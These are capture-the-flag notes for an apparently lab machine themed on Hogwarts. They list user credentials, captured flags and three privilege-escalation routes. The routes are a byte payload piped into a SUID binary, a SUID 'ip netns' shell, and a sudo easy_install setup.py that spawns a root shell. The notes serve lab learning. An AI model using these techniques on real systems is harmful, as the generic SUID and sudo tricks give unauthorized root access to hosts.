# HOGWARTS -->

you need rustscan for this machine download here: https://github.com/Macchimne/RUSTSCAN

# Users:

hermoine

neville:eos34dqa7qgwq8@006oudrri1

draco:slytherin

# Paths to root

/etc/room_of_requirement is a suid binary that will grant a root shell with:
{ echo -e "012345678901234567890123\xbe\xba\xfe\xca"; cat; } | /etc/room_of_requirement

(/bin/ip)  has the suid bit set. this can get root via:

ip netns add foo
ip netns exec foo /bin/sh -p



hermoine can run date as sudo, though this just allows file read as far as i can tell with date -f file



draco can run easy_install as root, which can privesc via:

TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF


# Flags:

THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}

THM{its_wingardium_laviosaa_Ron}

THM{Yeah_1_swallowed_the_sn1tch.}

THM{I_unarm3d_dumbled0re}
